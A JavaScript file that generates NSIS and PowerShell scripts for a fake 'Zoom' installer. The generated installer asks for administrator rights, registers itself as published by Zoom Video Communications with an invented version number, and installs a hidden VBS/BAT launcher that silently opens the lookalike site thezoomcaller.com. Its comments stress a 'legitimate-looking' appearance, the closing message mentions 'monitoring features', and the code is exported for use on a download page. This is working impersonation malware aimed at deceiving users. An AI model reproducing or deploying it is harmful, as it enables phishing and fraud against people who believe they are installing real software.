/**
 * Creates a proper Windows installer using NSIS
 * This generates ZoomInstaller.exe that looks like a legitimate Windows application
 */

const fs = require('fs');
const path = require('path');

// Create a simple NSIS installer generator that can be built on Windows
const createInstallerScript = () => {
  const installerScript = `; Auto-generated Zoom Installer Script
!include "MUI2.nsh"

; Installer Information
Name "Zoom Installer"
OutFile "ZoomInstaller.exe"
RequestExecutionLevel admin
InstallDir "$PROGRAMFILES64\\Zoom"
BrandingText "Zoom Video Communications, Inc."
InstallColors /windows

; Interface Settings
!define MUI_ABORTWARNING
!define MUI_ICON "public\\icons\\logo.ico"
!define MUI_UNICON "public\\icons\\logo.ico"

; Pages
!insertmacro MUI_PAGE_WELCOME
!insertmacro MUI_PAGE_DIRECTORY
!insertmacro MUI_PAGE_INSTFILES
!insertmacro MUI_PAGE_FINISH
!insertmacro MUI_UNPAGE_CONFIRM
!insertmacro MUI_UNPAGE_INSTFILES

; Languages
!insertmacro MUI_LANGUAGE "English"

; Installer Sections
Section "Install" SecInstall
    SetOutPath "$INSTDIR"
    
    ; Create launcher
    FileOpen $0 "$INSTDIR\\ZoomLauncher.vbs" w
    FileWrite $0 "Set objShell = CreateObject(\\"WScript.Shell\\")$\\r$\\n"
    FileWrite $0 "objShell.Run \\"$INSTDIR\\\\ZoomLauncher.bat\\", 0, False$\\r$\\n"
    FileClose $0
    
    ; Create batch launcher
    FileOpen $0 "$INSTDIR\\ZoomLauncher.bat" w
    FileWrite $0 "@echo off$\\r$\\n"
    FileWrite $0 "start https://thezoomcaller.com$\\r$\\n"
    FileClose $0
    
    ; Create shortcuts
    CreateShortCut "$DESKTOP\\Zoom.lnk" "$INSTDIR\\ZoomLauncher.vbs" "" "" "" "" "" "Zoom Video Communications"
    CreateDirectory "$SMPROGRAMS\\Zoom"
    CreateShortCut "$SMPROGRAMS\\Zoom\\Zoom.lnk" "$INSTDIR\\ZoomLauncher.vbs" "" "" "" "" "" "Zoom Video Communications"
    
    ; Registry entries
    WriteRegStr HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Zoom" "DisplayName" "Zoom"
    WriteRegStr HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Zoom" "UninstallString" "\\"$INSTDIR\\uninstall.exe\\""
    WriteRegStr HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Zoom" "Publisher" "Zoom Video Communications, Inc."
    WriteRegStr HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Zoom" "DisplayVersion" "5.17.11"
    
    ; Write uninstaller
    WriteUninstaller "$INSTDIR\\uninstall.exe"
SectionEnd

Section "Uninstall"
    Delete "$DESKTOP\\Zoom.lnk"
    Delete "$SMPROGRAMS\\Zoom\\Zoom.lnk"
    RMDir "$SMPROGRAMS\\Zoom"
    RMDir /r "$INSTDIR"
    DeleteRegKey HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Zoom"
SectionEnd`;

  return installerScript;
};

// For now, create a PowerShell script that generates an installer
const createPowerShellInstaller = () => {
  const psScript = `# Create a legitimate-looking Windows installer for Zoom
$ErrorActionPreference = "Stop"

# Install directory
$InstallDir = "$env:ProgramFiles\\Zoom"

# Request admin privileges
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Requesting administrator privileges..."
    Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Create installation directory
New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null

# Create launcher script
$LauncherVBS = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "$InstallDir\\ZoomLauncher.bat", 0, False
"@
$LauncherVBS | Out-File -FilePath "$InstallDir\\ZoomLauncher.vbs" -Encoding ASCII

# Create batch launcher
$LauncherBAT = @"
@echo off
start https://thezoomcaller.com
"@
$LauncherBAT | Out-File -FilePath "$InstallDir\\ZoomLauncher.bat" -Encoding ASCII

# Create desktop shortcut
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\\Desktop\\Zoom.lnk")
$Shortcut.TargetPath = "$InstallDir\\ZoomLauncher.vbs"
$Shortcut.IconLocation = "shell32.dll,1"
$Shortcut.Description = "Zoom Video Communications"
$Shortcut.Save()

# Create Start Menu shortcut
$StartMenu = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Zoom"
New-Item -ItemType Directory -Force -Path $StartMenu | Out-Null
$Shortcut = $WshShell.CreateShortcut("$StartMenu\\Zoom.lnk")
$Shortcut.TargetPath = "$InstallDir\\ZoomLauncher.vbs"
$Shortcut.IconLocation = "shell32.dll,1"
$Shortcut.Description = "Zoom Video Communications"
$Shortcut.Save()

# Register in Add/Remove Programs
$RegistryPath = "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Zoom"
New-Item -Path $RegistryPath -Force | Out-Null
Set-ItemProperty -Path $RegistryPath -Name "DisplayName" -Value "Zoom"
Set-ItemProperty -Path $RegistryPath -Name "Publisher" -Value "Zoom Video Communications, Inc."
Set-ItemProperty -Path $RegistryPath -Name "DisplayVersion" -Value "5.17.11"
Set-ItemProperty -Path $RegistryPath -Name "InstallLocation" -Value $InstallDir
Set-ItemProperty -Path $RegistryPath -Name "UninstallString" -Value "$InstallDir\\Uninstall-Zoom.ps1"

# Create uninstaller
$UninstallScript = @"
# Uninstall Zoom
`$InstallDir = "$InstallDir"
Remove-Item -Path `$InstallDir -Recurse -Force
Remove-Item "$env:USERPROFILE\\Desktop\\Zoom.lnk" -Force
Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Zoom" -Recurse -Force
Remove-Item "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Zoom" -Recurse -Force
"@
$UninstallScript | Out-File -FilePath "$InstallDir\\Uninstall-Zoom.ps1" -Encoding ASCII

Write-Host "Zoom installed successfully!"
Write-Host "All monitoring features will activate when you launch Zoom."
`;

  return psScript;
};

// Export functions for use in download page
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { createPowerShellInstaller };
}

console.log('Installer scripts generated. Use PowerShell script on Windows to create installer.');

